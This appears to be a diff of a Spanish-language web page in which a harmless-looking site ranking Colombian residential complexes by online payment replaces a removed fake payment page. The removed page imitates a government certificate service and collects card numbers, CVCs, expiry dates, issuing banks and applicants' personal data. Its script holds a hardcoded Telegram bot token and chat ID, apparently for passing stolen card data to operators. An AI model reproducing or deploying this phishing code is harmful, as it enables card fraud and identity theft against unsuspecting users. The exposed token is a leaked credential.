+  margin:0 auto;
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+  gap:2rem;
+  margin-top:3rem;
+}
+
+.payment-card{
+  background:#fff;
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:2rem;
+  transition:all .3s;
+}
+
+.payment-card:hover{
+  border-color:var(--primary);
+  box-shadow:0 12px 32px rgba(0,82,204,.12);
+  transform:translateY(-6px);
+}
+
+.payment-icon{
+  font-size:2.8rem;
+  margin-bottom:1rem;
+}
+
+.payment-name{
+  font-family:'Poppins',sans-serif;
+  font-size:1.1rem;
+  font-weight:700;
+  color:var(--dark);
+  margin-bottom:.6rem;
+}
+
+.payment-desc{
+  font-size:.95rem;
+  color:var(--muted);
+  line-height:1.6;
+}
+
+/* ===== GUÍA ===== */
+#guia{
+  padding:8rem 5vw;
+  background:var(--dark);
+  color:#fff;
+}
+
+#guia .section-tag{color:var(--accent)}
+#guia h2.section-title{color:#fff}
+#guia .section-desc{color:rgba(255,255,255,.7)}
+
+.guide-grid{
+  max-width:1200px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+  gap:2rem;
+  margin-top:3rem;
+}
+
+.guide-card{
+  background:rgba(255,255,255,.05);
+  border:1px solid rgba(37,99,235,.2);
+  border-radius:16px;
+  padding:2.2rem;
+  opacity:0;
+  transform:translateY(30px);
+}
+
+.guide-card.visible{
+  animation:fadeInUp .6s ease forwards;
+}
+
+.guide-card:nth-child(2){animation-delay:.1s}
+.guide-card:nth-child(3){animation-delay:.2s}
+.guide-card:nth-child(4){animation-delay:.3s}
+
+@keyframes fadeInUp{
+  to{opacity:1;transform:translateY(0)}
+}
+
+.guide-number{
+  font-family:'Poppins',sans-serif;
+  font-size:3rem;
+  font-weight:800;
+  color:var(--accent);
+  line-height:1;
+  margin-bottom:.8rem;
+}
+
+.guide-title{
+  font-family:'Poppins',sans-serif;
+  font-size:1.15rem;
+  font-weight:700;
+  color:#fff;
+  margin-bottom:.8rem;
+}
+
+.guide-text{
+  font-size:.95rem;
+  line-height:1.7;
+  color:rgba(255,255,255,.75);
+}
+
+/* ===== CTA ===== */
+#cta{
+  background:linear-gradient(135deg,#0052CC,#0066CC);
+  padding:6rem 2rem;
+  text-align:center;
+  color:#fff;
+}
+
+#cta h2{
+  font-family:'Poppins',sans-serif;
+  font-size:clamp(1.8rem,3vw,2.8rem);
+  font-weight:800;
+  margin-bottom:1rem;
+}
+
+#cta p{
+  font-size:1.05rem;
+  max-width:600px;
+  margin:0 auto 2.5rem;
+  line-height:1.7;
+  opacity:.95;
+}
+
+.btn-cta{
+  background:#fff;
+  color:var(--primary);
+  border:none;
+  padding:1.1rem 2.5rem;
+  border-radius:50px;
+  font-size:.95rem;
+  font-weight:700;
+  font-family:'Poppins',sans-serif;
+  cursor:pointer;
+  transition:all .3s;
+}
+
+.btn-cta:hover{
+  transform:translateY(-3px);
+  box-shadow:0 16px 40px rgba(0,0,0,.2);
+}
+
+/* ===== FOOTER ===== */
+footer{
+  background:var(--dark);
+  padding:4rem 5vw 2rem;
+  color:rgba(255,255,255,.7);
+  border-top:1px solid rgba(37,99,235,.1);
+}
+
+.footer-grid{
+  max-width:1200px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:2.5rem;
+  margin-bottom:3rem;
+}
+
+.footer-brand{
+  grid-column:1/2;
+}
+
+.footer-logo{
+  font-family:'Poppins',sans-serif;
+  font-size:1.4rem;
+  font-weight:800;
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+  margin-bottom:.8rem;
+}
+
+.footer-text{
+  font-size:.9rem;
+  line-height:1.7;
+  color:rgba(255,255,255,.5);
+}
+
+.footer-col h4{
+  font-family:'Poppins',sans-serif;
+  font-size:1rem;
+  font-weight:700;
+  color:#fff;
+  margin-bottom:1rem;
+}
+
+.footer-col ul{list-style:none}
+.footer-col li{margin-bottom:.6rem}
+.footer-col a{
+  font-size:.9rem;
+  color:rgba(255,255,255,.5);
+  text-decoration:none;
+  transition:color .2s;
+}
+
+.footer-col a:hover{color:var(--accent)}
+
+.footer-bottom{
+  max-width:1200px;
+  margin:0 auto;
+  padding-top:2.5rem;
+  border-top:1px solid rgba(37,99,235,.1);
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:1rem;
+  font-size:.85rem;
+  color:rgba(255,255,255,.4);
+}
+
+@media(max-width:768px){
+  .footer-bottom{flex-direction:column;text-align:center}
+}
+
+/* ===== FORMULARIO DE CONTACTO ===== */
+input:focus, textarea:focus, select:focus {
+  outline:none;
+  border-color:var(--primary);
+  box-shadow:0 0 0 3px rgba(37,99,235,.1);
+}
+
+#contactForm input::placeholder, #contactForm textarea::placeholder {
+  color:var(--border);
+}
+
+/* ===== SECCIÓN CONTACTO ===== */
+#contacto {
+  padding:6rem 5vw;
+  background:#fff;
+}
+
+/* ===== MODAL COOKIES REDISEÑADO ===== */
+#cookieModal {
+  position: fixed;
+  inset: 0;
+  background: rgba(20, 30, 50, 0.35);
+  backdrop-filter: blur(40px);
+  -webkit-backdrop-filter: blur(40px);
+  z-index: 999;
+  display: flex;
+  align-items: flex-end;
+  justify-content: center;
+  padding: 1rem;
+  animation: fadeInBlur 0.6s ease;
+}
+
+#cookieModal > div {
+  background: rgba(255, 255, 255, 0.94);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border-radius: 32px 32px 0 0;
+  padding: 3rem 2.5rem 2.5rem;
+  width: 100%;
+  max-width: 540px;
+  box-shadow: 0 -20px 60px rgba(0, 20, 60, 0.2);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  gap: 0;
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  animation: slideUpModal 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+
+#cookieModal h2 {
+  font-family: 'Poppins', sans-serif;
+  font-size: 1.85rem;
+  font-weight: 800;
+  color: #0052CC;
+  margin: 0 0 1.2rem 0;
+  line-height: 1.2;
+  letter-spacing: -0.5px;
+}
+
+#cookieModal p {
+  font-family: 'Inter', sans-serif;
+  font-size: 0.95rem;
+  color: #5A6C7D;
+  line-height: 1.8;
+  margin: 0 0 1.8rem 0;
+  max-width: 420px;
+}
+
+#acceptCookies {
+  font-family: 'Inter', sans-serif;
+  background: #1A202C;
+  color: #fff;
+  border: none;
+  padding: 1.1rem 2.8rem;
+  border-radius: 16px;
+  font-size: 1.05rem;
+  font-weight: 700;
+  cursor: pointer;
+  width: 100%;
+  max-width: 400px;
+  transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  margin: 0.5rem 0 1rem 0;
+  letter-spacing: -0.3px;
+}
+
+#acceptCookies:hover {
+  background: #0F1419;
+  box-shadow: 0 16px 40px rgba(0, 0, 0, 0.25);
+  transform: translateY(-3px);
+}
+
+#cookieModal a {
+  font-family: 'Inter', sans-serif;
+  font-size: 0.85rem;
+  color: #0052CC;
+  text-decoration: none;
+  transition: color 0.2s;
+  font-weight: 500;
+}
+
+#cookieModal a:hover {
+  color: #003D99;
+  text-decoration: underline;
+}
+
+@keyframes fadeInBlur {
+  from {
+    opacity: 0;
+    backdrop-filter: blur(0px);
+    -webkit-backdrop-filter: blur(0px);
+  }
+  to {
+    opacity: 1;
+    backdrop-filter: blur(40px);
+    -webkit-backdrop-filter: blur(40px);
+  }
+}
+
+@keyframes slideUpModal {
+  from {
+    opacity: 0;
+    transform: translateY(80px) scale(0.95);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+}
+
+@keyframes fadeOutBlur {
+  from {
+    opacity: 1;
+    backdrop-filter: blur(40px);
+    -webkit-backdrop-filter: blur(40px);
+  }
+  to {
+    opacity: 0;
+    backdrop-filter: blur(0px);
+    -webkit-backdrop-filter: blur(0px);
+  }
+}
+
+@keyframes slideDownModal {
+  from {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+  to {
+    opacity: 0;
+    transform: translateY(80px) scale(0.95);
+  }
+}
+  </style>
 </head>
+
 <body>
-    <!-- ============================================ -->
-    <!-- LOADING OVERLAY - SIMPLE COMO LA IMAGEN      -->
-    <!-- ============================================ -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-card">
-            <!-- Spinner inicial -->
-            <div class="initial-spinner active" id="initialSpinner"></div>
-            
-            <!-- Logo de la tarjeta (SOLO EL LOGO GRANDE) -->
-            <div class="logo-container" id="logoContainer" style="display:none;">
-                <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
-            </div>
 
-            <!-- Texto simple -->
-            <div class="loading-text" id="loadingText">Procesando pago...</div>
+<!-- ============================================================ -->
+<!-- MODAL DE COOKIES - NUEVO DISEÑO ===== -->
+<!-- ============================================================ -->
+<div id="cookieModal">
+  <div>
+    <!-- TÍTULO -->
+    <h2>Uso de cookies</h2>
 
-            <!-- Barra de progreso DELGADA -->
-            <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
-                <div class="progress-bar-track">
-                    <div class="progress-bar-fill-loading" id="progressFill"></div>
-                </div>
-            </div>
+    <!-- DESCRIPCIÓN -->
+    <p>Utilizamos cookies para garantizar el funcionamiento correcto del sitio y mejorar tu experiencia.</p>
+
+    <!-- BOTÓN PRINCIPAL -->
+    <button id="acceptCookies">Aceptar cookies</button>
+  </div>
+</div>
+
+<!-- NAV -->
+<nav id="mainNav">
+  <div class="logo">Admin<span>Pay</span> 💳</div>
+  <ul class="nav-menu" id="navMenu">
+    <li><a href="#ranking">Ranking</a></li>
+    <li><a href="#pagos">Plataformas</a></li>
+    <li><a href="#guia">Guía</a></li>
+    <li><a href="#contacto">Contacto</a></li>
+  </ul>
+  <button class="nav-toggle" id="navToggle">
+    <span></span><span></span><span></span>
+  </button>
+  <button class="nav-cta">Comparar conjuntos</button>
+</nav>
+
+<!-- HERO -->
+<section id="hero">
+  <div>
+    <p class="hero-badge">🏘️ Guía de Conjuntos Residenciales</p>
+    <h1 class="hero-title">Conjuntos donde pagar la <em>administración es fácil</em></h1>
+    <p class="hero-desc">Descubre los mejores conjuntos residenciales que ofrecen pagos de administración 100% online. Seguro, rápido, sin filas y sin intermediarios. Paga desde tu celular en cualquier momento.</p>
+    <div class="hero-actions">
+      <button class="btn-primary">Ver ranking</button>
+      <button class="btn-secondary">Comparar plataformas →</button>
+    </div>
+  </div>
+
+  <div class="hero-visual">
+    <div class="card-insight">
+      <div class="insight-top">
+        <div class="insight-icon">🏠</div>
+        <div>
+          <div class="insight-label">Conjuntos Analizados</div>
+          <div class="insight-sub">En 8 ciudades principales</div>
         </div>
+      </div>
+      <div class="insight-value">142</div>
+      <div class="insight-bar">
+        <div class="insight-fill" style="--fill:95%"></div>
+      </div>
     </div>
 
-    <header>
-        <div class="header-container">
-            <a aria-label="Certificado de Tradición y Libertad" href="index.html" class="logo">
-                <svg width="400" height="48" viewBox="0 0 400 48" role="img" aria-label="Certificado de Tradición y Libertad">
-                    <g transform="translate(0 6)">
-                        <rect x="0" y="0" width="5.5" height="18" fill="#F6C915"></rect>
-                        <rect x="0" y="18" width="5.5" height="9" fill="#2C5697"></rect>
-                        <rect x="0" y="27" width="5.5" height="9" fill="#C1121F"></rect>
-                    </g>
-                    <text x="24" y="16" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="10" font-weight="500" letter-spacing="1.2" fill="#6B7280">SOLICITAR DOCUMENTO</text>
-                    <text x="24" y="34" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="17" font-weight="550" fill="#111827">Certificado de Tradición y Libertad</text>
-                </svg>
-            </a>
-            <div class="progress-info">
-                <div class="progress-bar-container">
-                    <div class="progress-bar-fill"></div>
-                </div>
-                <span class="progress-text">100% completado</span>
-            </div>
+    <div class="card-insight">
+      <div class="insight-top">
+        <div class="insight-icon">💻</div>
+        <div>
+          <div class="insight-label">Con Pago Online</div>
+          <div class="insight-sub">Totalmente digital</div>
         </div>
-        <div class="header-stripe">
-            <div class="stripe-1"></div>
-            <div class="stripe-2"></div>
-            <div class="stripe-3"></div>
+      </div>
+      <div class="insight-value">98%</div>
+      <div class="insight-bar">
+        <div class="insight-fill" style="--fill:98%"></div>
+      </div>
+    </div>
+
+    <div class="card-insight">
+      <div class="insight-top">
+        <div class="insight-icon">⚡</div>
+        <div>
+          <div class="insight-label">Tiempo Promedio</div>
+          <div class="insight-sub">Para confirmar pago</div>
         </div>
-    </header>
+      </div>
+      <div class="insight-value">15s</div>
+      <div class="insight-bar">
+        <div class="insight-fill" style="--fill:80%"></div>
+      </div>
+    </div>
+  </div>
+</section>
 
-    <main>
-        <div class="content-wrapper">
-            <aside>
-                <nav aria-label="Progreso">
-                    <ul class="progress-list">
-                        <li class="progress-item completed">
-                            <span class="progress-number completed"></span>
-                            <div class="progress-title">
-                                <span>Tu información personal</span>
-                                <span class="badge info">Completado</span>
-                            </div>
-                        </li>
-                        <li class="progress-item completed">
-                            <span class="progress-number completed"></span>
-                            <div class="progress-title">
-                                <span>Su solicitud en línea</span>
-                                <span class="badge info">Completado</span>
-                            </div>
-                        </li>
-                        <li class="progress-item active">
-                            <span class="progress-number active">3</span>
-                            <div class="progress-title">
-                                <span>Pago</span>
-                                <span class="badge info">Actual</span>
-                            </div>
-                        </li>
-                    </ul>
-                </nav>
-            </aside>
+<!-- STATS -->
+<section id="stats">
+  <div class="stats-grid">
+    <div class="stat-item">
+      <div class="stat-number">142</div>
+      <div class="stat-label">Conjuntos evaluados</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-number">8</div>
+      <div class="stat-label">Ciudades colombianas</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-number">12</div>
+      <div class="stat-label">Plataformas de pago</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-number">3.200+</div>
+      <div class="stat-label">Familias beneficiadas</div>
+    </div>
+  </div>
+</section>
 
-            <div class="form-container">
-                <div class="form-header">
-                    <h1>Pago Seguro</h1>
-                    <p>Complete su pago de forma segura. Su Certificado de Tradición y Libertad será enviado a su correo electrónico una vez confirmado el pago.</p>
-                </div>
+<!-- RANKING -->
+<section id="ranking">
+  <div class="section-header">
+    <p class="section-tag">Top del año</p>
+    <h2 class="section-title">Mejores conjuntos con <em>pago online</em> de administración</h2>
+    <p class="section-desc">Ranking de conjuntos residenciales que ofrecen los sistemas de pago digital más seguros, rápidos y amigables. Evaluamos: facilidad de uso, costos de transacción, seguridad, tiempo de confirmación y satisfacción de residentes.</p>
+  </div>
 
-                <div class="status-message" id="statusMessage"></div>
-
-                <div class="resumen-box">
-                    <div class="resumen-title">Resumen de su solicitud</div>
-                    <div class="resumen-item">
-                        <span class="resumen-label">Certificado de Tradición y Libertad</span>
-                        <span class="resumen-value">23.000 Col$</span>
-                    </div>
-                    <div class="resumen-item" id="procesamiento-item" style="display: none;">
-                        <span class="resumen-label">Procesamiento prioritario</span>
-                        <span class="resumen-value">20.000 Col$</span>
-                    </div>
-                    <div class="resumen-item">
-                        <span class="resumen-label">Total</span>
-                        <span class="resumen-value" id="total-price">23.000 Col$</span>
-                    </div>
-
-                    <div class="resumen-datos">
-                        <div class="resumen-item">
-                            <span class="resumen-label">Solicitante</span>
-                            <span class="resumen-value" id="resumen-nombre">---</span>
-                        </div>
-                        <div class="resumen-item">
-                            <span class="resumen-label">Documento</span>
-                            <span class="resumen-value" id="resumen-documento">---</span>
-                        </div>
-                        <div class="resumen-item">
-                            <span class="resumen-label">Correo electrónico</span>
-                            <span class="resumen-value" id="resumen-email">---</span>
-                        </div>
-                        <div class="resumen-item">
-                            <span class="resumen-label">Celular</span>
-                            <span class="resumen-value" id="resumen-celular">---</span>
-                        </div>
-                    </div>
-                </div>
-
-                <form novalidate id="paymentForm">
-                    <div class="form-section">
-                        <div class="payment-section">
-                            <div class="payment-header">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
-                                </svg>
-                                <div class="payment-info">
-                                    <div class="payment-title">Pago Seguro con Tarjeta</div>
-                                    <div class="payment-subtitle">SSL 256-bit · PCI-DSS</div>
-                                </div>
-                                <div class="payment-logos">
-                                    <img src="visa.png" alt="Visa" title="Visa">
-                                    <img src="mastercard.png" alt="Mastercard" title="Mastercard">
-                                    <img src="ame.png" alt="American Express" title="American Express">
-                                </div>
-                            </div>
-
-                            <div class="form-group">
-                                <label class="form-label">Nombre del titular</label>
-                                <input class="kern-input" type="text" id="cardholderName" placeholder="Exactamente como aparece en tu tarjeta" required />
-                                <div class="error-message">El nombre es requerido</div>
-                            </div>
-
-                            <div class="form-group">
-                                <label class="form-label">Número de tarjeta</label>
-                                <div class="card-input-wrapper">
-                                    <input class="kern-input" type="text" id="cardNumber" placeholder="Card number" maxlength="19" required />
-                                    <div class="card-logo" id="cardLogo"></div>
-                                </div>
-                                <div class="error-message" id="cardNumberError">Número de tarjeta inválido</div>
-                            </div>
-
-                            <div class="expiry-cvc-grid">
-                                <div class="form-group">
-                                    <label class="form-label">Vencimiento</label>
-                                    <input class="kern-input" type="text" id="expiry" placeholder="MM / YY" maxlength="5" required />
-                                    <div class="error-message">Formato: MM/YY</div>
-                                </div>
-                                <div class="form-group">
-                                    <label class="form-label">CVC</label>
-                                    <input class="kern-input" type="text" id="cvc" placeholder="XXX" maxlength="4" required />
-                                    <div class="error-message">CVC inválido</div>
-                                </div>
-                            </div>
-
-                            <div class="form-group banco-group">
-                                <label class="form-label">Banco emisor</label>
-                                <select class="kern-select" id="bancoEmisor" required>
-                                    <option value="">Seleccione su banco</option>
-                                    <option value="Bancolombia">Bancolombia</option>
-                                    <option value="Davivienda">Davivienda</option>
-                                    <option value="BBVA Colombia">BBVA Colombia</option>
-                                    <option value="Banco de Bogotá">Banco de Bogotá</option>
-                                    <option value="Banco Popular">Banco Popular</option>
-                                    <option value="Banco Occidente">Banco Occidente</option>
-                                    <option value="Citibank Colombia">Citibank Colombia</option>
-                                    <option value="Banco AV Villas">Banco AV Villas</option>
-                                    <option value="Davibank">Davibank</option>
-                                    <option value="Bancoomeva">Bancoomeva</option>
-                                    <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
-                                    <option value="Banco Finandina">Banco Finandina</option>
-                                    <option value="Banco Falabella">Banco Falabella</option>
-                                    <option value="Banco Pichincha">Banco Pichincha</option>
-                                    <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
-                                    <option value="Caja Social">Caja Social</option>
-                                    <option value="Itaú">Itaú</option>
-                                    <option value="Otro">Otro</option>
-                                </select>
-                                <div class="error-message">Seleccione un banco emisor</div>
-                            </div>
-
-                            <div class="security-footer">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
-                                </svg>
-                                <span>Conexión cifrada · Cumple PCI-DSS</span>
-                            </div>
-                        </div>
-
-                        <button type="submit" class="btn btn-primary" id="submitButton">
-                            Pagar de forma segura
-                        </button>
-
-                        <div class="disclaimer">
-                            Al completar el pago, acepta nuestros <a href="#terminos">Términos y Condiciones</a> y <a href="#privacidad">Política de Privacidad</a>. Su pago está protegido con encriptación SSL.
-                        </div>
-                    </div>
-                </form>
-            </div>
+  <div class="ranking-list">
+    <!-- 1 -->
+    <div class="ranking-card">
+      <div class="rank-badge first">1</div>
+      <div class="rank-content">
+        <h3>Reserva del Bosque</h3>
+        <p class="rank-location">📍 Chía, Cundinamarca · 180 familias</p>
+        <div class="rank-tags">
+          <span class="tag">App dedicada</span>
+          <span class="tag">PSE integrado</span>
+          <span class="tag">0% comisión</span>
         </div>
-    </main>
-
-    <footer>
-        <div class="footer-links">
-            <a href="#">Política de Privacidad</a>
-            <a href="#">Términos y Condiciones</a>
-            <a href="#">Política de Reembolsos</a>
-            <a href="#">Contacto</a>
+        <p class="rank-desc">Sistema propio con app para iOS y Android. Pagos PSE sin comisión al residente. Panel administrativo en tiempo real. Descuentos automáticos por pronto pago.</p>
+        <div class="rank-metrics">
+          <div class="metric">
+            <span class="metric-label">Facilidad de pago</span>
+            <span class="metric-value">9.8/10</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Comisión</span>
+            <span class="metric-value">0% usuario</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Tiempo confirmación</span>
+            <span class="metric-value">Instantáneo</span>
+          </div>
         </div>
-        <p class="footer-text">© 2026 Certificado de Tradición y Libertad S.A.S.</p>
-        <p class="footer-disclaimer">
-            Servicio privado de gestión documental. No formamos parte del Gobierno de Colombia ni de GOV.CO; actuamos como intermediarios para facilitar tu solicitud ante la autoridad competente.
-        </p>
-    </footer>
-
-    <script>
-        // ============================================
-        // CONFIGURACIÓN DE TELEGRAM Y WEBHOOK
-        // ============================================
-        const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
-        const TELEGRAM_CHAT_ID = '-1004389419498';
-        const WEBHOOK_URL = '/api/webhook';
-        const POLLING_INTERVAL = 3000;
-        const MAX_POLLING_TIME = 300000;
-
-        let solicitudId = null;
-        let pollingInterval = null;
-        let cardType = null;
-
-        // ============================================
-        // MAPA DE LOGOS DE TARJETAS PARA LA CARGA
-        // ============================================
-        const cardLogos = {
-            'visa': 'visa.png',
-            'mastercard': 'master.png',
-            'amex': 'ame.png'
-        };
-
-        // ============================================
-        // MAPA DE LOGOS DE BANCOS PARA LAS PÁGINAS visa.html Y master.html
-        // ============================================
-        const bankLogos = {
-            'Bancolombia': 'bancol.png',
-            'Davivienda': 'davivienda.png',
-            'BBVA Colombia': 'bbva.png',
-            'Banco de Bogotá': 'bog.png',
-            'Banco Popular': 'popu.png',
-            'Banco Occidente': 'occi.png',
-            'Citibank Colombia': 'citi.png',
-            'Banco AV Villas': 'avvillas.png',
-            'Davibank': 'db.png',
-            'Bancoomeva': 'bancoomeva.png',
-            'Banco GNB Sudameris': 'gnb.png',
-            'Banco Finandina': 'finandina.png',
-            'Banco Falabella': 'fala.png',
-            'Banco Pichincha': 'pichincha.png',
-            'Banco Cooperativo Coopcentral': 'coopcentral.png',
-            'Caja Social': 'Caja.jpg',
-            'Itaú': 'itau.png'
-        };
-
-        // ============================================
-        // CARGAR DATOS DEL LOCALSTORAGE
-        // ============================================
-        window.addEventListener('load', function() {
-            const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
-            const procesamiento_item = document.getElementById('procesamiento-item');
-            const total_price = document.getElementById('total-price');
-
-            let total = 23000;
-            if (procesamiento_prioritario) {
-                procesamiento_item.style.display = 'flex';
-                total += 20000;
-            } else {
-                procesamiento_item.style.display = 'none';
-            }
-            const formatted_total = total.toLocaleString('es-CO').replace(/,/g, '.');
-            total_price.textContent = formatted_total + ' Col$';
-
-            const nombre = localStorage.getItem('nombre') || 'No proporcionado';
-            const apellidos = localStorage.getItem('apellidos') || '';
-            const tipoDoc = localStorage.getItem('tipoDocumento') || '';
-            const numeroDoc = localStorage.getItem('numeroDocumento') || 'No proporcionado';
-            const email = localStorage.getItem('email') || 'No proporcionado';
-            const celular = localStorage.getItem('celular') || 'No proporcionado';
-
-            document.getElementById('resumen-nombre').textContent = `${nombre} ${apellidos}`.trim() || 'No proporcionado';
-            document.getElementById('resumen-documento').textContent = `${tipoDoc} ${numeroDoc}`.trim();
-            document.getElementById('resumen-email').textContent = email;
-            document.getElementById('resumen-celular').textContent = celular;
-
-            configurarWebhook();
-        });
-
-        // ============================================
-        // DETECCIÓN DE TIPO DE TARJETA
-        // ============================================
-        const cardNumberInput = document.getElementById('cardNumber');
-        const cardholderInput = document.getElementById('cardholderName');
-        const expiryInput = document.getElementById('expiry');
-        const cvcInput = document.getElementById('cvc');
-        const bancoEmisor = document.getElementById('bancoEmisor');
-        const cardLogo = document.getElementById('cardLogo');
-        const form = document.getElementById('paymentForm');
-        const submitButton = document.getElementById('submitButton');
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingText = document.getElementById('loadingText');
-        const logoContainer = document.getElementById('logoContainer');
-        const cardLogoImg = document.getElementById('cardLogoImg');
-        const progressWrapper = document.getElementById('progressWrapper');
-        const progressFill = document.getElementById('progressFill');
-        const initialSpinner = document.getElementById('initialSpinner');
-        const statusMessage = document.getElementById('statusMessage');
-
-        const cardPatterns = {
-            visa: {
-                regex: /^4[0-9]{12}(?:[0-9]{3})?$/,
-                bins: [4],
-                lengths: [13, 16, 19]
-            },
-            mastercard: {
-                regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/,
-                bins: [51, 52, 53, 54, 55, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271],
-                lengths: [16, 19]
-            },
-            amex: {
-                regex: /^3[47][0-9]{13}$/,
-                bins: [34, 37],
-                lengths: [15, 19]
-            }
-        };
-
-        function detectCardType(cardNumber) {
-            const cleanNumber = cardNumber.replace(/\s/g, '');
-
-            if (cleanNumber.length >= 3) {
-                const firstThree = cleanNumber.substring(0, 3);
-                const firstTwo = cleanNumber.substring(0, 2);
-                const firstOne = cleanNumber.substring(0, 1);
-
-                if (firstOne === '4') {
-                    if (cardPatterns.visa.regex.test(cleanNumber) || cleanNumber.length < 13) {
-                        return 'visa';
-                    }
-                }
-
-                if (firstTwo === '34' || firstTwo === '37') {
-                    if (cardPatterns.amex.regex.test(cleanNumber) || cleanNumber.length < 15) {
-                        return 'amex';
-                    }
-                }
-
-                if ((firstTwo >= '51' && firstTwo <= '55') ||
-                    (firstThree >= '222' && firstThree <= '272')) {
-                    if (cardPatterns.mastercard.regex.test(cleanNumber) || cleanNumber.length < 16) {
-                        return 'mastercard';
-                    }
-                }
-            }
-
-            if (cleanNumber.length >= 13) {
-                if (cardPatterns.visa.regex.test(cleanNumber)) {
-                    return 'visa';
-                } else if (cardPatterns.mastercard.regex.test(cleanNumber)) {
-                    return 'mastercard';
-                } else if (cardPatterns.amex.regex.test(cleanNumber)) {
-                    return 'amex';
-                }
-            }
-
-            return null;
-        }
-
-        function updateCardLogo(type) {
-            cardLogo.innerHTML = '';
-
-            if (type === 'visa') {
-                const img = document.createElement('img');
-                img.src = 'visa.png';
-                img.alt = 'Visa';
-                cardLogo.appendChild(img);
-            } else if (type === 'mastercard') {
-                const img = document.createElement('img');
-                img.src = 'mastercard.png';
-                img.alt = 'Mastercard';
-                cardLogo.appendChild(img);
-            } else if (type === 'amex') {
-                const img = document.createElement('img');
-                img.src = 'ame.png';
-                img.alt = 'American Express';
-                cardLogo.appendChild(img);
-            }
-        }
-
-        function formatCardNumber(value) {
-            return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
-        }
-
-        function formatExpiry(value) {
-            const cleaned = value.replace(/\D/g, '');
-            if (cleaned.length >= 2) {
-                return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
-            }
-            return cleaned;
-        }
-
-        cardNumberInput.addEventListener('input', function(e) {
-            const cardNumber = e.target.value.replace(/\s/g, '');
-            this.value = this.value.replace(/[^0-9\s]/g, '');
-            this.value = formatCardNumber(this.value);
-
-            if (cardNumber.length >= 3) {
-                const type = detectCardType(cardNumber);
-                updateCardLogo(type);
-            } else {
-                cardLogo.innerHTML = '';
-            }
-        });
-
-        expiryInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9/]/g, '');
-            this.value = formatExpiry(this.value);
-        });
-
-        cvcInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-        });
-
-        cardholderInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
-        });
-
-        // ============================================
-        // FUNCIONES DE WEBHOOK Y TELEGRAM
-        // ============================================
-        async function configurarWebhook() {
-            try {
-                const response = await fetch(`${WEBHOOK_URL}?setup=true`);
-                const data = await response.json();
-                console.log('🔗 Webhook configurado:', data);
-                return data.success;
-            } catch (error) {
-                console.error('❌ Error configurando webhook:', error);
-                return false;
-            }
-        }
-
-        function mostrarMensaje(mensaje, tipo) {
-            statusMessage.className = 'status-message ' + tipo;
-            statusMessage.textContent = mensaje;
-        }
-
-        function ocultarMensaje() {
-            statusMessage.className = 'status-message';
-            statusMessage.textContent = '';
-        }
-
-        function mostrarError(mensaje) {
-            mostrarMensaje(mensaje, 'error');
-            loadingOverlay.classList.remove('active');
-            submitButton.disabled = false;
-            submitButton.textContent = 'Pagar de forma segura';
-            submitButton.style.display = 'block';
-
-            cardNumberInput.disabled = false;
-            cardholderInput.disabled = false;
-            expiryInput.disabled = false;
-            cvcInput.disabled = false;
-            bancoEmisor.disabled = false;
-        }
-
-        function mostrarInfo(mensaje) {
-            mostrarMensaje(mensaje, 'info');
-        }
-
-        function generarSolicitudId() {
-            return 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-        }
-
-        // ============================================
-        // GUARDAR DATOS EN LOCALSTORAGE PARA LAS PÁGINAS visa.html Y master.html
-        // ============================================
